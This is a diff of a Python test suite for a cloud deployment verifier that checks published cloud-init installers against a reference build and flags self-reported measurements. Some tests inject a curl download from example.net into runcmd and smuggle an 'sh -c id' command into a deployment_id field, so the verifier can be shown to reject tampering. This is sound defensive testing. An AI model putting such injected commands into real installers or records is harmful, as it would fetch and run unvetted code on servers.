@@ -489,7 +489,7 @@ class Host:
     def provider(self):
         return {"provider": self.world.key or "generic", "instance_id": getattr(self.world, "server_id", "machine-1"),
                 "public_ipv4": getattr(self.world, "ipv4", None), **assurance.user_data_hashes(self.user_data()),
-                **self.override}
+                "user_data_redacted": assurance.redact_user_data(self.user_data()), **self.override}
 
     def get(self, url, timeout):
         description = re.search(r"^ *(\{\"commit\".*\})$", self.user_data(), re.M).group(1)
@@ -544,6 +544,30 @@ def run_verify(world, host, out, **changes):
 
 def checks(report):
     return {c["check"]: c["status"] for c in report["checks"]}
+
+
+def detail(report, check):
+    return next(c["detail"] for c in report["checks"] if c["check"] == check)
+
+
+def build_here(command, input, **options):
+    """What the builder does in a separate interpreter, done in this one with this checkout's code."""
+    spec, tunnel = json.loads(input)
+    build = cloud.install_script if spec["provider"] == "generic" else cloud.cloud_init
+    return NS(returncode=0, stdout=assurance.redact_user_data(build(spec, tunnel, "x" * 43, "x" * 32)).encode(), stderr=b"")
+
+
+@pytest.fixture
+def real_reference():
+    """Requested by tests that build the reference installer in a separate interpreter, as a verifier does."""
+
+
+@pytest.fixture(autouse=True)
+def reference_in_process(request, monkeypatch):
+    # A new interpreter importing requests takes seconds here; one test below runs the real one.
+    if "real_reference" not in request.fixturenames:
+        original = cloud.reference_installer
+        monkeypatch.setattr(cloud, "reference_installer", lambda record, source: original(record, source, run=build_here))
 
 
 def test_cloud_init_installs_one_commit_masks_ssh_and_publishes_without_secrets(tmp_path):
@@ -697,6 +721,23 @@ def test_host_evidence_mismatches_fail(setup):
     assert checks(run_verify(world, host, out))["binding"] == "fail"
 
 
+def test_bootstrap_measurements_are_explicitly_self_reported(setup):
+    world, host, _record, out = setup(Hetzner)
+    original = world.user_data
+    world.user_data += "\n# Synthetic unexpected bootstrap change\n"
+    assert checks(run_verify(world, host, out))["binding"] == "fail"
+    # Model a compromised collector reporting the original values, its user data included. Provider APIs
+    # remain honest; there is no independent measurement of the runtime here.
+    host.override = {**assurance.user_data_hashes(original), "user_data_redacted": assurance.redact_user_data(original)}
+    report = run_verify(world, host, out)
+    assert report["result"] == "pass", [c for c in report["checks"] if c["status"] != "pass"]
+    assert report["verification_scope"] == "deployment-consistency"
+    assert report["assurance"]["independent_runtime_attestation"] == "not-performed"
+    assert report["assurance"]["key_nonexportability"] == "not-established"
+    shown = cloud.render(report)
+    assert "Deployment checks" in shown and "malicious bootstrap" in shown
+
+
 def test_a_deleted_hetzner_firewall_fails_the_report_instead_of_stopping_it(setup):
     world, host, _record, out = setup(Hetzner)
     world.firewall, world.server["public_net"]["firewalls"] = None, []
@@ -780,6 +821,71 @@ def test_hand_installed_journal_tolerates_the_installer_login_only(journal):
     store.append("host.state", {"instance_id": "m", **state, "logins": 2, "before": {"logins": 1}})
     cloud.verify_journal(report, export_file(store, vault, "zip"), fingerprint(vault.public_key), "m", generic=True)
     assert report.checks[-1]["status"] == "fail"
+
+
+def test_reference_installer_is_built_by_the_checkouts_own_code(tmp_path, monkeypatch, real_reference):
+    monkeypatch.setattr(cloud, "REFERENCES", {})
+    spec = cloud.specification(arguments(tmp_path, server_type="cpx22"), resolve=lambda repository, ref: ref)
+    record = {**spec, "tunnel": {"id": TUNNEL}}
+    built = cloud.reference_installer(record, ROOT)
+    assert built == assurance.redact_user_data(cloud.cloud_init(spec, TUNNEL, "p" * 43, "eyJhIjoi" + "c" * 60))
+    with pytest.raises(cloud.DeployError, match="reference installer"):  # not a checkout of TgWitness
+        cloud.reference_installer(record, tmp_path)
+
+
+def test_installer_must_equal_the_reference_byte_for_byte(setup):
+    world, host, record, out = setup(Hetzner)
+    published = (out / "cloud-init.redacted.yaml").read_bytes()
+    report = run_verify(world, host, out)
+    assert checks(report)["cloud_init"] == "pass" and "byte for byte equal" in detail(report, "cloud_init")
+    assert "the user data the server read from its metadata service" in detail(report, "cloud_init")
+    # The old check passed anything that named the commit and masked SSH.
+    added = out / "added.yaml"
+    added.write_bytes(published.replace(b"runcmd:", b"runcmd:\n  - [curl, -o, /tmp/x, https://example.net/x]"))
+    report = run_verify(world, host, out, cloud_init=added)
+    assert checks(report)["cloud_init"] == "fail" and "published installer differs" in detail(report, "cloud_init")
+    # The server reports user data its hash agrees with, but not the installer the commit builds.
+    host.override = {"user_data_redacted": published.decode() + "# extra\n",
+                     "user_data_redacted_sha256": assurance.user_data_hashes(published.decode() + "# extra\n")["user_data_sha256"]}
+    report = run_verify(world, host, out, cloud_init=None)
+    assert checks(report)["cloud_init"] == "fail" and 'unexpected "# extra\\n"' in detail(report, "cloud_init")
+    host.override = {"user_data_redacted": published.decode() + "# extra\n"}  # text and hash disagree
+    assert "its own SHA-256" in detail(run_verify(world, host, out), "binding")
+    host.override = {"user_data_redacted": None}  # a collector that reports only the hash
+    report = run_verify(world, host, out)
+    assert checks(report)["cloud_init"] == "pass" and "not the user data itself" in detail(report, "cloud_init")
+    host.override = {}
+    assert checks(run_verify(world, host, out, source=None))["cloud_init"] == "unavailable"
+    # A record value deploy never writes cannot carry its own lines into the reference.
+    forged = json.loads((out / "deployment.json").read_text())
+    forged["deployment_id"] += "\nruncmd: [[sh, -c, id]]"
+    (out / "deployment.json").write_text(json.dumps(forged))
+    report = run_verify(world, host, out)
+    assert checks(report)["cloud_init"] == "fail" and "never writes" in detail(report, "cloud_init")
+
+
+def test_journal_starts_carry_the_reference_installer_and_imported_keys_are_marked(journal):
+    store, vault = journal
+    reference = "#cloud-config\n# reference\n"
+    state = {"boot_id": "boot-1", "ssh_listening": False, "ssh_processes": 0, "sessions": 0, "logins": 0}
+    provider = {"instance_id": 42, **assurance.user_data_hashes(reference)}
+    store.append("process.started", {"run": {"host": {"provider": provider, **state}}})
+    store.append("account.authorized", {"account_id": 44, "key_origin": "created"})
+
+    def run():
+        report = cloud.Report()
+        cloud.verify_journal(report, export_file(store, vault, "zip"), fingerprint(vault.public_key), 42, reference=reference)
+        return {c["check"]: c for c in report.checks}
+    found = run()
+    assert found["journal"]["status"] == "pass" and found["account_key"]["status"] == "pass"
+    store.append("account.authorized", {"account_id": 44, "key_origin": "imported"})
+    store.append("account.authorized", {"account_id": 44})
+    found = run()
+    assert found["account_key"]["status"] == "review" and "imported session" in found["account_key"]["detail"]
+    assert "does not say where" in found["account_key"]["detail"]
+    store.append("process.started", {"run": {"host": {"provider": {"instance_id": 42, **assurance.user_data_hashes("x")},
+                                                      **state}}})
+    assert "other than the reference installer" in run()["journal"]["detail"]
 
 
 @pytest.mark.parametrize("key, answers, expected", [
